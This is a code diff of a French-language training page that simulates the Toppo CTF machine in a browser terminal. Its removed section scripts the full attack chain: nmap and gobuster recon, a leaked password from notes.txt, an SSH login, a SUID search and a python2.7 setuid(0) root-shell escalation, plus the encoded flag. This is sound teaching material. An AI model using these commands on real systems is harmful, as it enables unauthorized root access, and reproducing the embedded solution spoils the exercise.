@@ -6,10 +6,11 @@
 <title>Toppo — Chaîne complète</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="lab.css?v=5">
-<!-- Le thème "vrai terminal Kali/BackTrack" (fond noir, entête bordeaux,
-     police terminal, palette de prompt) vit désormais dans lab.css, partagé
-     par tous les cours du hub — plus de surcouche locale ici. -->
+<link rel="stylesheet" href="lab.css?v=7">
+<style>
+  /* Ajustement local : la classe .dim dans les sorties dynamiques du shell */
+  .sim-line .o.dim{color:var(--term-dim);}
+</style>
 </head>
 <body>
 
@@ -326,14 +327,14 @@
 
     <section id="practice">
       <h2 class="section-title">Terminal d'entraînement</h2>
-      <p class="section-intro">Rejoue la chaîne complète, commande par commande. Le shell change d'utilisateur au fur et à mesure — comme sur la vraie machine.</p>
+      <p class="section-intro">Rejoue la chaîne complète, commande par commande. Le shell change d'utilisateur au fur et à mesure — comme sur la vraie machine. Explore librement : tu peux te balader dans l'arborescence, lire d'autres fichiers, rater des commandes.</p>
 
       <div class="term-launch">
         <button class="term-launch-btn" id="term-open-btn" type="button">
           <span class="term-launch-dot"></span>
           Ouvrir le terminal
         </button>
-        <p class="term-launch-sub">Plein écran · shell simulé · historique ↑ / ↓</p>
+        <p class="term-launch-sub">Plein écran · shell simulé · historique ↑ / ↓ · explore librement</p>
       </div>
     </section>
 
@@ -344,6 +345,7 @@
     </footer>
   </div>
 
+  <!-- ============================ TERMINAL PLEIN ÉCRAN ============================ -->
   <div class="term-fullscreen" id="term-fullscreen">
     <div class="term-fs-header">
       <div class="term-fs-headrow">
@@ -370,13 +372,14 @@
         <span class="item">Cible <strong id="ib-target">192.168.56.102</strong></span>
         <span class="item">Attaquant <strong id="ib-attacker">192.168.56.101</strong></span>
       </div>
+      <div class="term-findings" id="term-findings" aria-label="Informations découvertes pendant l'exercice"></div>
       <div class="phase-track" id="phase-track"></div>
       <div class="term-progress">
         <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
-        <span class="term-progress-label" id="sim-progress">étape 1/6</span>
+        <span class="term-progress-label" id="sim-progress">score 0.0/20</span>
       </div>
       <div class="term-fs-consigne" id="term-fs-consigne">
-        <span class="consigne-tag" id="consigne-tag">Consigne</span>
+        <span class="consigne-tag" id="consigne-tag">Objectif</span>
         <span class="consigne-text" id="consigne-text">—</span>
       </div>
     </div>
@@ -384,16 +387,16 @@
     <div class="sim-body" id="sim-body">
       <div class="sim-line sim-inputline" id="sim-inputline">
         <span class="p" id="sim-prompt-label">$</span>
-        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ historique, Tab complète)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="text">
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ historique)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" inputmode="text">
       </div>
     </div>
 
     <div class="term-fs-footer">
       <div class="sim-hint-box" id="sim-hint-box"></div>
       <div class="sim-controls">
-        <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
-        <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
-        <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
+        <button class="sim-btn" id="sim-hint-btn" type="button">💡 Indice</button>
+        <button class="sim-btn" id="sim-solution-btn" type="button">🔍 Solution</button>
+        <button class="sim-btn" id="sim-reset-btn" type="button">↺ Recommencer</button>
         <form class="flag-form" id="flag-form" autocomplete="off" novalidate>
           <span class="flag-icon" aria-hidden="true">⚑</span>
           <input id="flag-input" class="flag-input" type="text" placeholder="0wnedlab{…}" aria-label="Flag à valider" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="120" name="flag-answer-not-stored">
@@ -404,7 +407,7 @@
     </div>
   </div>
 
-
+  <!-- ============================ MODALE FLAG ============================ -->
   <div class="flag-modal" id="flag-modal" role="dialog" aria-modal="true" aria-labelledby="flag-modal-title" aria-hidden="true">
     <canvas class="flag-confetti" id="flag-confetti" aria-hidden="true"></canvas>
     <div class="flag-card" id="flag-card">
@@ -441,249 +444,453 @@
     </div>
   </div>
 
-<script>
-  // Validation du flag : on ne stocke qu'une empreinte salée (SHA-256), jamais le flag en clair.
-  const FLAG_SALT = "toppo\u00b7lab\u00b7v1\u00b7";
-  const FLAG_HASH = "805303268a2f81cbeec3a0d2321bda4f1bd28a8905570d4d1018b4fc30ca1030";
-</script>
-<script>
-  const steps = [
-    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Lance une reconnaissance complète de la cible.",
-      accepted:["nmap -sv -sc 192.168.56.102"],
-      hint:"-sV + -sC + IP.",
-      hint2:"nmap -sV -sC 192.168.56.102",
-      note:"nmap -sV -sC &lt;cible&gt; → ports, versions, scripts NSE.",
-      output:[
-        {t:"Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 05:58 -0400", c:"o"},
-        {t:"Nmap scan report for 192.168.56.102", c:"o"},
-        {t:"Host is up (0.00023s latency).", c:"o"},
-        {t:"Not shown: 997 closed tcp ports (reset)", c:"o"},
-        {t:"PORT    STATE SERVICE VERSION", c:"o"},
-        {t:"22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)", c:"o", id:"hl-ssh"},
-        {t:"80/tcp  open  http    Apache httpd 2.4.10 ((Debian))", c:"o", id:"hl-http"},
-        {t:"|_http-title: Clean Blog - Start Bootstrap Theme", c:"o"},
-        {t:"111/tcp open  rpcbind 2-4 (RPC #100000)", c:"o"},
-        {t:"MAC Address: 08:00:27:32:ED:29 (Oracle VirtualBox virtual NIC)", c:"o"},
-        {t:"Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel", c:"o"},
-        {t:"", c:"o"},
-        {t:"Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .", c:"o"},
-        {t:"Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds", c:"o"}
-      ] },
+  <!-- ============================ SCRIPTS ============================ -->
+  <!--
+    Ordre important :
+      1. sim-utils.js   → briques (sha256, VFS builders, permissions)
+      2. sim-engine.js  → moteur (shell, VFS navigable, réseau, SSH, scoring)
+      3. sim-data-toppo.js → les données du cours (VFS Toppo, objectifs, flag)
+      4. le script inline ci-dessous → branche l'UI sur le moteur
+  -->
+  <script src="sim-utils.js"></script>
+  <script src="sim-engine.js"></script>
+  <script src="sim-data-toppo.js"></script>
+  <script>
+  (function () {
+    "use strict";
 
-    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Énumère les répertoires web de la cible.",
-      accepted:["gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"],
-      hint:"Outil : gobuster. Mode : dir. -u URL. -w wordlist.",
-      hint2:"gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
-      note:"gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; → liste des répertoires/fichiers accessibles.",
-      output:[
-        {t:"===============================================================", c:"o"},
-        {t:"Gobuster v3.8.2", c:"o"},
-        {t:"===============================================================", c:"o"},
-        {t:"[+] Url:                     http://192.168.56.102", c:"o"},
-        {t:"[+] Method:                  GET", c:"o"},
-        {t:"[+] Threads:                 10", c:"o"},
-        {t:"[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", c:"o"},
-        {t:"===============================================================", c:"o"},
-        {t:"Starting gobuster in directory enumeration mode", c:"o"},
-        {t:"===============================================================", c:"o"},
-        {t:"img                  (Status: 301) [Size: 314] [--> http://192.168.56.102/img/]", c:"o"},
-        {t:"mail                 (Status: 301) [Size: 315] [--> http://192.168.56.102/mail/]", c:"o"},
-        {t:"admin                (Status: 301) [Size: 316] [--> http://192.168.56.102/admin/]", c:"o", id:"hl-admin"},
-        {t:"css                  (Status: 301) [Size: 314] [--> http://192.168.56.102/css/]", c:"o"},
-        {t:"manual               (Status: 301) [Size: 317] [--> http://192.168.56.102/manual/]", c:"o"},
-        {t:"js                   (Status: 301) [Size: 313] [--> http://192.168.56.102/js/]", c:"o"},
-        {t:"vendor               (Status: 301) [Size: 317] [--> http://192.168.56.102/vendor/]", c:"o"},
-        {t:"LICENSE              (Status: 200) [Size: 1093]", c:"ok"},
-        {t:"server-status        (Status: 403) [Size: 302]", c:"err"},
-        {t:"Progress: 220558 / 220558 (100.00%)", c:"o"},
-        {t:"===============================================================", c:"o"},
-        {t:"Finished", c:"o"},
-        {t:"===============================================================", c:"o"}
-      ] },
-
-    { kind:"type", phase:"recon", context:"kali@kali", prompt:"$",
-      task:"Lis le fichier d'indices exposé dans /admin/.",
-      accepted:["curl http://192.168.56.102/admin/notes.txt"],
-      hint:"curl + URL complète du fichier notes.txt trouvé dans /admin/.",
-      hint2:"curl http://192.168.56.102/admin/notes.txt",
-      note:"curl &lt;URL&gt; → récupère le contenu brut d'un fichier exposé.",
-      output:[
-        {t:"Note to myself :", c:"o"},
-        {t:"I need to change my password :/", c:"o"},
-        {t:"12345ted123 is too outdated but the technology isn't my thing", c:"ok", id:"hl-pass"},
-        {t:"i prefer go fishing or watching soccer .", c:"o"}
-      ] },
-
-    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"$",
-      task:"Connecte-toi en SSH avec l'utilisateur trouvé.",
-      accepted:["ssh ted@192.168.56.102"],
-      hint:"ssh + utilisateur (ted) + @ + IP.",
-      hint2:"ssh ted@192.168.56.102",
-      note:"ssh &lt;user&gt;@&lt;IP&gt; → connexion distante. La clé d'hôte sera d'abord demandée.",
-      output:[
-        {t:"The authenticity of host '192.168.56.102' can't be established.", c:"o"},
-        {t:"ED25519 key fingerprint is: SHA256:vJgmhqKOmHq0Mb0plSTyOdzw6GenPEkZkch+PIVozzw", c:"o"},
-        {t:"Are you sure you want to continue connecting (yes/no/[fingerprint])? ", c:"o"}
-      ] },
-
-    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"",
-      task:"Accepte l'empreinte de la clé d'hôte pour poursuivre la connexion.",
-      accepted:["yes"],
-      hint:"Il faut répondre explicitement par écrit, pas juste appuyer sur Entrée.",
-      hint2:"yes",
-      note:"Tape yes pour faire confiance à cette clé d'hôte et l'ajouter à known_hosts.",
-      output:[
-        {t:"Warning: Permanently added '192.168.56.102' (ED25519) to the list of known hosts.", c:"o"},
-        {t:"ted@192.168.56.102's password: ", c:"o"}
-      ] },
-
-    { kind:"type", phase:"exploitation", context:"kali@kali", prompt:"", mask:true,
-      task:"Saisis le mot de passe de ted trouvé dans notes.txt.",
-      accepted:["12345ted123"],
-      hint:"C'est le mot de passe repéré dans le fichier notes.txt à l'étape précédente.",
-      hint2:"12345ted123",
-      note:"La saisie du mot de passe n'est jamais affichée en clair dans un vrai terminal SSH.",
-      output:[
-        {t:"Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY.", c:"o"},
-        {t:"Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29", c:"o"}
-      ] },
-
-    { kind:"type", phase:"post-exploitation", context:"ted@Toppo", prompt:"$",
-      task:"Cherche les binaires SUID sur la machine.",
-      accepted:["find / -perm -4000 -type f 2>/dev/null"],
-      hint:"find / -perm -4000 -type f, avec 2>/dev/null pour cacher les erreurs de permission.",
-      hint2:"find / -perm -4000 -type f 2>/dev/null",
-      note:"find / -perm -4000 -type f 2>/dev/null → liste tous les binaires SUID root.",
-      output:[
-        {t:"/sbin/mount.nfs", c:"o"},
-        {t:"/usr/sbin/exim4", c:"o"},
-        {t:"/usr/lib/eject/dmcrypt-get-device", c:"o"},
-        {t:"/usr/lib/dbus-1.0/dbus-daemon-launch-helper", c:"o"},
-        {t:"/usr/lib/openssh/ssh-keysign", c:"o"},
-        {t:"/usr/bin/gpasswd", c:"o"},
-        {t:"/usr/bin/newgrp", c:"o"},
-        {t:"/usr/bin/python2.7", c:"flag", id:"hl-suid"},
-        {t:"/usr/bin/chsh", c:"o"},
-        {t:"/usr/bin/at", c:"o"},
-        {t:"/usr/bin/mawk", c:"o"},
-        {t:"/usr/bin/chfn", c:"o"},
-        {t:"/usr/bin/procmail", c:"o"},
-        {t:"/usr/bin/passwd", c:"o"},
-        {t:"/bin/su", c:"o"},
-        {t:"/bin/umount", c:"o"},
-        {t:"/bin/mount", c:"o"}
-      ] },
-
-    { kind:"type", phase:"post-exploitation", context:"ted@Toppo", prompt:"$",
-      task:"Exploite le SUID anormal pour obtenir un shell root.",
-      accepted:["python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"],
-      hint:"Utilise python2.7 avec -c et une commande qui appelle setuid(0) puis lance /bin/bash.",
-      hint2:"python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
-      note:"Un interpréteur SUID root permet de forcer setuid(0) et de lancer un shell root.",
-      output:[
-        {t:"root@Toppo:~# ", c:"ok"},
-        {t:"uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)", c:"ok"}
-      ] },
-
-    { kind:"type", phase:"post-exploitation", context:"root@Toppo", prompt:"#",
-      task:"Lis le flag final.",
-      accepted:["cat /root/flag.txt"],
-      hint:"cat + le chemin du fichier dans /root/.",
-      hint2:"cat /root/flag.txt",
-      note:"Le flag final est dans /root/flag.txt.",
-      output:[
-        {t:"_________                                  ", c:"flag"},
-        {t:"|  _   _  |                                 ", c:"flag"},
-        {t:"|_/ | | \\_|.--.   _ .--.   _ .--.    .--.   ", c:"flag"},
-        {t:"    | |  / .'`\\ \\[ '/'`\\ \\[ '/'`\\ \\/ .'`\\ \\ ", c:"flag"},
-        {t:"   _| |_ | \\__. | | \\__/ | | \\__/ || \\__. | ", c:"flag"},
-        {t:"  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  ", c:"flag"},
-        {t:"                 [__|     [__|              ", c:"flag"},
-        {t:"", c:"flag"},
-        {enc:"Q29uZ3JhdHVsYXRpb25zICEgdGhlcmUgaXMgeW91ciBmbGFnIDogMHduZWRsYWJ7cDRzc2kwbl9jMG1lX3dpdGhfcHJhY3QxY2V9", c:"flag"}
-      ] }
-  ];
-
-  let freeContext = "root@Toppo";
-  const freeCommands = {
-    "root@Toppo": {
-      "whoami": [{t:"root", c:"ok"}],
-      "id": [{t:"uid=0(root) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)", c:"ok"}],
-      "ls /root/": [
-        {t:"flag.txt  .bashrc  .profile", c:"o"}
-      ],
-      "ls -la /root/": [
-        {t:"total 24", c:"o"},
-        {t:"drwx------  2 root root 4096 Apr 15  2018 .", c:"o"},
-        {t:"drwxr-xr-x 21 root root 4096 Apr 15  2018 ..", c:"o"},
-        {t:"-rw-------  1 root root   53 Apr 15  2018 .bash_history", c:"o"},
-        {t:"-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc", c:"o"},
-        {t:"-rw-r--r--  1 root root  397 Apr 15  2018 flag.txt", c:"o"},
-        {t:"-rw-r--r--  1 root root  140 Nov 19  2007 .profile", c:"o"}
-      ],
-      "cat /root/flag.txt": [
-        {enc:"MHduZWRsYWJ7cDRzc2kwbl9jMG1lX3dpdGhfcHJhY3QxY2V9", c:"flag"}
-      ],
-      "uname -a": [
-        {t:"Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux", c:"o"}
-      ],
-      "cat /etc/issue": [
-        {t:"Debian GNU/Linux 8 \\n \\l", c:"o"}
-      ],
-      "hostname -I": [
-        {t:"192.168.56.102", c:"o"}
-      ],
-      "ls -la /etc/cron*": [
-        {t:"-rw-r--r-- 1 root root  722 Jun  7  2015 /etc/crontab", c:"o"},
-        {t:"", c:"o"},
-        {t:"/etc/cron.d:", c:"o"},
-        {t:"total 20", c:"o"},
-        {t:"drwxr-xr-x  2 root root 4096 Apr 15  2018 .", c:"o"},
-        {t:"drwxr-xr-x 90 root root 4096 Apr 15  2018 ..", c:"o"},
-        {t:"-rw-r--r--  1 root root  244 Dec 28  2014 anacron", c:"o"},
-        {t:"-rw-r--r--  1 root root  661 Jan  5  2018 php5", c:"o"},
-        {t:"-rw-r--r--  1 root root  102 Jun  7  2015 .placeholder", c:"o"},
-        {t:"", c:"o"},
-        {t:"/etc/cron.daily:", c:"o"},
-        {t:"total 72", c:"o"},
-        {t:"drwxr-xr-x  2 root root 4096 Apr 15  2018 .", c:"o"},
-        {t:"drwxr-xr-x 90 root root 4096 Apr 15  2018 ..", c:"o"},
-        {t:"-rwxr-xr-x  1 root root  311 Dec 28  2014 0anacron", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root  625 Mar 31  2018 apache2", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root 15000 Dec 11  2016 apt", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root  314 Nov  8  2014 aptitude", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root  355 Oct 17  2014 bsdmainutils", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root 1597 May  2  2016 dpkg", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root 4125 Feb 10  2018 exim4-base", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root   89 Nov  8  2014 logrotate", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root 1293 Dec 31  2014 man-db", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root  435 Jun 13  2013 mlocate", c:"ok"},
-        {t:"-rwxr-xr-x  1 root root  249 May 17  2017 passwd", c:"ok"},
-        {t:"-rw-r--r--  1 root root  102 Jun  7  2015 .placeholder", c:"o"},
-        {t:"", c:"o"},
-        {t:"/etc/cron.hourly:", c:"o"},
-        {t:"total 12", c:"o"},
-        {t:"drwxr-xr-x  2 root root 4096 Apr 15  2018 .", c:"o"},
-        {t:"drwxr-xr-x 90 root root 4096 Apr 15  2018 ..", c:"o"},
-        {t:"-rw-r--r--  1 root root  102 Jun  7  2015 .placeholder", c:"o"}
-      ],
-      "history": [
-        {t:"    1  whoami", c:"o"},
-        {t:"    2  id", c:"o"},
-        {t:"    3  uname -a", c:"o"},
-        {t:"    4  ls -la /root/", c:"o"},
-        {t:"    5  cat /root/flag.txt", c:"o"},
-        {t:"    6  history", c:"o"}
-      ],
-      "exit": {t:"logout", c:"o"}
+    // ---------- récupération du cours ----------
+    const COURSE = window.COURSE_TOPPO;
+    if (!COURSE) {
+      console.error("[lab-toppo] COURSE_TOPPO manquant — vérifie sim-data-toppo.js");
+      return;
     }
-  };
+    if (!window.PentestSim || !window.PentestSim.Engine) {
+      console.error("[lab-toppo] PentestSim.Engine manquant — vérifie sim-engine.js");
+      return;
+    }
 
-  let freeHintHtml = "Session root ouverte. Tape <strong style=\"color:#e0c060\">whoami</strong>, <strong style=\"color:#e0c060\">id</strong>, <strong style=\"color:#e0c060\">uname -a</strong>, <strong style=\"color:#e0c060\">ls -la /etc/cron*</strong> ou <strong style=\"color:#e0c060\">cat /root/flag.txt</strong>.";
-</script>
-<script src="engine.js?v=5"></script>
+    // ---------- refs UI ----------
+    const $ = (id) => document.getElementById(id);
+    const body       = $("sim-body");
+    const input      = $("sim-input");
+    const inputline  = $("sim-inputline");
+    const ctxEl      = $("sim-context");
+    const promptLbl  = $("sim-prompt-label");
+    const progressEl = $("sim-progress");
+    const progressFill = $("term-progress-fill");
+    const consigneEl = $("consigne-text");
+    const consigneTag = $("consigne-tag");
+    const hintBox    = $("sim-hint-box");
+    const findingsEl = $("term-findings");
+    const phaseTrackEl = $("phase-track");
+
+    // ---------- moteur ----------
+    const engine = new PentestSim.Engine(COURSE);
+    const hintedObjectives = new Set();
+    let maskNextInput = false;
+    let startedAt = Date.now();
+    let hintCount = 0;
+    let solCount = 0;
+
+    // ---------- helpers rendu ----------
+    function pushLine(node) {
+      body.insertBefore(node, inputline);
+      body.scrollTop = body.scrollHeight;
+    }
+    function makeCmdLine(promptHtml, cmd) {
+      const div = document.createElement("div");
+      div.className = "sim-line appear";
+      div.innerHTML = (promptHtml ? '<span class="p">' + promptHtml + "</span> " : "") +
+                      '<span class="cmd-text">' + PentestSim.esc(cmd) + "</span>";
+      return div;
+    }
+    function makeOutLine(l) {
+      const div = document.createElement("div");
+      div.className = "sim-line appear";
+      const cls = l.c === "ok" ? "ok"
+                : l.c === "err" ? "err"
+                : l.c === "flag" ? "flag"
+                : l.c === "dim" ? "dim"
+                : "";
+      div.innerHTML = '<span class="o ' + cls + '">' + (PentestSim.esc(l.t) || "&nbsp;") + "</span>";
+      return div;
+    }
+    function renderPrompt() {
+      const p = engine.promptParts();
+      ctxEl.textContent = p.user + "@" + p.host + ": " + p.path;
+      promptLbl.innerHTML =
+        '<span class="p-user">' + p.user + "@" + p.host + "</span>" +
+        '<span class="p-punc">:' + p.path + "</span>" +
+        '<span class="p-dollar">' + p.sym + "</span>";
+    }
+    function renderFindings() {
+      findingsEl.innerHTML = "";
+      engine.state.findings.forEach(function (f) {
+        const chip = document.createElement("button");
+        chip.type = "button";
+        chip.className = "finding-chip";
+        chip.setAttribute("data-copy", f.value);
+        chip.setAttribute("title", "Copier");
+        chip.innerHTML =
+          '<span class="fc-label">' + PentestSim.esc(f.label) + "</span>" +
+          '<span class="fc-value">' + PentestSim.esc(f.value) + "</span>" +
+          '<span class="fc-copy" aria-hidden="true">⧉</span>';
+        findingsEl.appendChild(chip);
+      });
+      findingsEl.classList.toggle("show", engine.state.findings.length > 0);
+    }
+    function renderProgress() {
+      const sc = engine.computeScore();
+      const pct = sc.maxRaw ? Math.round((sc.raw / sc.maxRaw) * 100) : 0;
+      progressFill.style.width = pct + "%";
+      progressEl.textContent = "score " + sc.note.toFixed(1) + "/20";
+    }
+    function renderPhaseTrack() {
+      // fil d'ariane simplifié : 5 phases fixes
+      const PHASES = [
+        { key: "recon", label: "recon" },
+        { key: "web", label: "web" },
+        { key: "accès", label: "accès" },
+        { key: "enum", label: "énumération" },
+        { key: "root", label: "root" }
+      ];
+      // détermine la phase courante à partir des objectifs validés
+      const done = new Set();
+      COURSE.objectives.forEach(function (o) { if (engine.objectiveStatus(o)) done.add(o.id); });
+      let current = "recon";
+      if (done.has("scan")) current = "web";
+      if (done.has("find-notes")) current = "accès";
+      if (done.has("ssh-ted")) current = "enum";
+      if (done.has("find-suid")) current = "root";
+      if (done.has("privesc")) current = "root";
+      phaseTrackEl.innerHTML = "";
+      PHASES.forEach(function (p) {
+        const pill = document.createElement("span");
+        pill.className = "phase-pill" + (p.key === current ? " active" : "");
+        pill.textContent = p.label;
+        phaseTrackEl.appendChild(pill);
+      });
+    }
+    function setConsigne() {
+      const pending = COURSE.objectives.filter(function (o) { return !engine.objectiveStatus(o); });
+      if (!pending.length) {
+        consigneTag.textContent = "Terminé";
+        consigneEl.textContent = "Tous les objectifs sont validés. Valide le flag en bas.";
+        $("sim-hint-btn").dataset.obj = "";
+        $("sim-solution-btn").dataset.obj = "";
+        return;
+      }
+      pending.sort(function (a, b) { return b.points - a.points; });
+      const next = pending[0];
+      consigneTag.textContent = "Objectif (" + next.points + " pts)";
+      consigneEl.textContent = next.label;
+      $("sim-hint-btn").dataset.obj = next.id;
+      $("sim-solution-btn").dataset.obj = next.id;
+    }
+
+    // ---------- exécution ----------
+    async function run(raw) {
+      const trimmed = raw.trim();
+      if (!trimmed) return;
+      engine.cmdHistory.push(raw);
+      engine.historyPos = engine.cmdHistory.length;
+
+      const promptHtml = promptLbl.innerHTML;
+      const shown = maskNextInput ? "•".repeat(trimmed.length) : trimmed;
+      pushLine(makeCmdLine(promptHtml, shown));
+      maskNextInput = false;
+
+      let res;
+      try {
+        res = await engine.exec(trimmed);
+      } catch (e) {
+        res = { lines: [{ t: "erreur interne : " + e.message, c: "err" }] };
+      }
+
+      if (engine._clearRequested) {
+        engine._clearRequested = false;
+        Array.from(body.children).forEach(function (c) { if (c !== inputline) c.remove(); });
+      }
+      (res.lines || []).forEach(function (l) { pushLine(makeOutLine(l)); });
+
+      if (res.prompt) {
+        promptLbl.innerHTML = PentestSim.esc(res.prompt.label);
+        maskNextInput = !!res.prompt.mask;
+      } else if (res.done && !engine._pendingSsh) {
+        renderPrompt();
+      }
+
+      renderFindings();
+      renderProgress();
+      renderPhaseTrack();
+      setConsigne();
+    }
+
+    // ---------- input ----------
+    input.addEventListener("keydown", async function (e) {
+      if (e.key === "ArrowUp") {
+        e.preventDefault();
+        if (engine.historyPos > 0) {
+          engine.historyPos--;
+          input.value = engine.cmdHistory[engine.historyPos] || "";
+        }
+        return;
+      }
+      if (e.key === "ArrowDown") {
+        e.preventDefault();
+        if (engine.historyPos < engine.cmdHistory.length - 1) {
+          engine.historyPos++;
+          input.value = engine.cmdHistory[engine.historyPos] || "";
+        } else {
+          engine.historyPos = engine.cmdHistory.length;
+          input.value = "";
+        }
+        return;
+      }
+      if (e.key === "Tab") { e.preventDefault(); return; }
+      if (e.key === "Enter") {
+        const raw = input.value;
+        input.value = "";
+        await run(raw);
+      }
+    });
+
+    // ---------- indice ----------
+    $("sim-hint-btn").addEventListener("click", function () {
+      const objId = $("sim-hint-btn").dataset.obj;
+      if (!objId) return;
+      const obj = COURSE.objectives.find(function (o) { return o.id === objId; });
+      if (!obj) return;
+      if (hintedObjectives.has(objId)) {
+        hintBox.classList.remove("show");
+        return;
+      }
+      engine.useHint(objId);
+      hintedObjectives.add(objId);
+      hintCount++;
+      hintBox.textContent = "💡 " + (obj.hint || "Pas d'indice pour cet objectif.");
+      hintBox.classList.add("show");
+      renderProgress();
+    });
+
+    // ---------- solution ----------
+    $("sim-solution-btn").addEventListener("click", function () {
+      const objId = $("sim-solution-btn").dataset.obj;
+      if (!objId) return;
+      const obj = COURSE.objectives.find(function (o) { return o.id === objId; });
+      if (!obj) return;
+      engine.useSolution(objId);
+      solCount++;
+      if (obj.solution) {
+        hintBox.textContent = "🔍 Solution : " + obj.solution;
+        hintBox.classList.add("show");
+      }
+      renderProgress();
+    });
+
+    // ---------- reset ----------
+    $("sim-reset-btn").addEventListener("click", function () {
+      engine.state.events.clear();
+      engine.state.findings.length = 0;
+      engine.state.findingKeys.clear();
+      engine.state.hints = {};
+      engine.state.solutions = {};
+      engine.state.flagValidated = false;
+      engine.state.hostId = COURSE.attacker.id;
+      engine.state.user = COURSE.attacker.user;
+      engine.state.cwd = COURSE.attacker.home;
+      engine.state.sshAttempts = 0;
+      engine.state.lockedUntil = 0;
+      engine._pendingSsh = null;
+      engine._clearRequested = false;
+      engine.cmdHistory = [];
+      engine.historyPos = 0;
+      hintedObjectives.clear();
+      maskNextInput = false;
+      hintCount = 0;
+      solCount = 0;
+      startedAt = Date.now();
+      Array.from(body.children).forEach(function (c) { if (c !== inputline) c.remove(); });
+      hintBox.classList.remove("show");
+      hintBox.innerHTML = "";
+      const msg = $("flag-msg");
+      if (msg) { msg.textContent = ""; msg.className = "flag-msg"; }
+      const fi = $("flag-input");
+      if (fi) { fi.value = ""; fi.disabled = false; }
+      const fs = $("flag-submit");
+      if (fs) fs.disabled = false;
+      renderFindings(); renderProgress(); renderPhaseTrack(); setConsigne(); renderPrompt();
+    });
+
+    // ---------- flag ----------
+    $("flag-form").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const val = $("flag-input").value.trim();
+      const msg = $("flag-msg");
+      if (!val) {
+        msg.textContent = "colle ou tape le flag d'abord";
+        msg.className = "flag-msg bad";
+        return;
+      }
+      msg.textContent = "vérification…";
+      msg.className = "flag-msg";
+      const ok = await engine.checkFlag(val);
+      if (ok) {
+        engine.state.flagValidated = true;
+        msg.textContent = "✓ flag validé";
+        msg.className = "flag-msg ok";
+        $("flag-input").disabled = true;
+        $("flag-submit").disabled = true;
+
+        // stats
+        const statTime = $("flag-stat-time");
+        if (statTime) {
+          const sec = Math.round((Date.now() - startedAt) / 1000);
+          statTime.textContent = String(Math.floor(sec / 60)).padStart(2, "0") + ":" + String(sec % 60).padStart(2, "0");
+        }
+        const statH = $("flag-stat-hints");
+        if (statH) statH.textContent = String(hintCount);
+        const statS = $("flag-stat-sols");
+        if (statS) statS.textContent = String(solCount);
+
+        // progression partagée avec le hub (index.html)
+        try {
+          const KEY = "pentestlab-progress";
+          const all = JSON.parse(localStorage.getItem(KEY)) || {};
+          const sc = engine.computeScore();
+          const prev = all[COURSE.id];
+          if (!prev || !prev.solved || sc.note > prev.score) {
+            all[COURSE.id] = {
+              solved: true,
+              hints: hintCount,
+              sols: solCount,
+              score: sc.note,
+              ts: Date.now()
+            };
+            localStorage.setItem(KEY, JSON.stringify(all));
+          }
+        } catch (err) { /* ignore */ }
+
+        // ouvre la modale
+        const modal = $("flag-modal");
+        if (modal) {
+          modal.classList.add("open");
+          modal.setAttribute("aria-hidden", "false");
+          const card = $("flag-card");
+          if (card) { card.classList.remove("play"); void card.offsetWidth; card.classList.add("play"); }
+        }
+        renderProgress();
+      } else {
+        msg.textContent = "flag incorrect";
+        msg.className = "flag-msg bad";
+      }
+    });
+
+    // ---------- modale : fermeture ----------
+    function closeModal() {
+      const modal = $("flag-modal");
+      if (!modal) return;
+      modal.classList.remove("open");
+      modal.setAttribute("aria-hidden", "true");
+    }
+    const btnClose = $("flag-modal-close");
+    if (btnClose) btnClose.addEventListener("click", closeModal);
+    const btnX = $("flag-modal-x");
+    if (btnX) btnX.addEventListener("click", closeModal);
+    const btnReplay = $("flag-modal-replay");
+    if (btnReplay) btnReplay.addEventListener("click", function () {
